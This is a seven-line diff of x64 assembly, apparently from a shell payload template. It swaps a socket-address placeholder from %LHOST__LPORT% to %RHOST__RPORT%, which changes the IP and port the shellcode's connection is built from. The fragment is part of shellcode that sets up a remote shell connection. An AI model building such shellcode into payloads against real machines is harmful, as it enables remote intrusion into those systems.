@@ -114,7 +114,7 @@ save_beginning:
     mov r14,rsp
     sub rsp,0x1a0
     mov r13,rsp
-    mov r12,%LHOST__LPORT%0002 ; 4 bytes for IP, 2 for the port
+    mov r12,%RHOST__RPORT%0002 ; 4 bytes for IP, 2 for the port
     push r12
     mov r12,rsp
     mov rcx,r14
